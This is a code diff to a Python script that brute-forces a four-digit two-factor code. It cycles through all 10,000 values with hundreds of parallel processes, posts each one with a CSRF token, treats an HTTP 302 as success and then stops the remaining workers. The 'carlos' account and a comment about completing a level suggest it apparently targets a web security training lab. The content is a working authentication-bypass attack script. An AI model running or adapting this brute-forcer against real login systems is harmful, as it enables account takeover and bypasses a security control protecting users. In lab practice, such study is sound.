@@ -7,20 +7,19 @@ import multiprocessing
 # To create a single session
 global s
 global site
+global event
 
 
 def Check_Second_Factor_Code(web_response, factor_code):
     if web_response == 302:
-        print(f'\n\n\n\n\n\n\n\n\n\n\n\n\n2fa valid with response code {web_response}')
-        print(f'2fa valid code: {factor_code}\n\n\n\n\n\n\n\n\n\n\n\n\n')
-        s.get('https://{site}/my-account?id=carlos')
+        print(f'2fa valid with response code {web_response}')
+        print(f'2fa valid code: {factor_code}')
+        event.set()
         # Visit account profile page to complete level
-"""
     else:
-        print("\n")
-        # print(f'2fa invalid with response code: {web_response}')
-        # print(f'2fa invalid code: {factor_code}')
-"""
+        if(event.is_set()):
+            print(event.is_set())
+            print("Exiting a incorrect 2fa thread")
 
 
 def Login_to_account(factor_code):
@@ -48,7 +47,7 @@ def Login_to_account(factor_code):
         'csrf': csrf,
         'mfa-code': str(factor_code).zfill(4)
     }
-    resp = s.post(login2_url, data=login2data, allow_redirects=True)
+    resp = s.post(login2_url, data=login2data, allow_redirects=False)
     Check_Second_Factor_Code(resp.status_code, factor_code)
 
 
@@ -58,12 +57,14 @@ if __name__ == '__main__':
         site = site.rstrip('/').lstrip('https://')
 
     s = requests.Session()
+    event = multiprocessing.Event()
 
     # Generate a list of 0-9999
     factor_code_list = list(i for i in range(10000))
     # Get alot of workers.
     # workers = multiprocessing.cpu_count() * 21
-    workers = 500
+    workers = 250
 
     with multiprocessing.Pool(workers) as w:
         w.map(Login_to_account, factor_code_list)
+        w.terminate()
